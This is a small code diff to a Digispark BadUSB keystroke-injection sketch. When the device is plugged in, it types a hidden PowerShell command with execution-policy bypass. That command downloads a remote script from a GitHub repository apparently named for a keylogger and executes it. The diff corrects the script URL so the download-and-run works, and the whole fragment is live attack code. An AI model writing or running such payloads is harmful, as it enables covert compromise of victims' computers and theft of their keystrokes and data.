@@ -17,7 +17,7 @@ void setup() {
 DigiKeyboard.print("powershell -NoP -Win H -Noni -Exec Bypass");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(300);
-DigiKeyboard.print("IEX(IWR https://raw.githubusercontent.com/ISykeI/Ds-KL/main/pwned%3A).ps1 -UseBasicParsing); Invoke-pwned:).ps1;");
+DigiKeyboard.print("IEX(IWR https://raw.githubusercontent.com/ISykeI/Ds-KL/main/pwned.ps1 -UseBasicParsing); Invoke-pwned.ps1;");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(400);
 
